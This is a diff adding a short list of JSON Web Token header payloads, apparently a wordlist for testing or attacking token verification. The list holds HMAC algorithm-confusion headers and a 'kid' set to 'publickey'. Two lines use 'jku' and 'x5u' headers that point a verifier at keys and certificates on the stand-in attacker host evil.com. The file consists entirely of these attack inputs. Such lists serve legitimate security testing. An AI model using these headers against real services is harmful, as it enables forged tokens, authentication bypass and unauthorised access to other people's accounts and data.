@@ -1,0 +1,10 @@
+{"alg":"HS256"}
+{"alg":"HS384"}
+{"alg":"HS512"}
+{"alg":"HS256","typ":"JWT"}
+{"alg":"HS256","kid":"publickey"}
+{"alg":"HS256","jku":"https://evil.com/jwks.json"}
+{"alg":"HS256","x5u":"https://evil.com/cert.pem"}
+{"alg":"HS256","typ":"JWT","kid":"confusion"}
+{"alg":"HS256","cty":"JWT"}
+{"alg":"HS256","crit":[]}
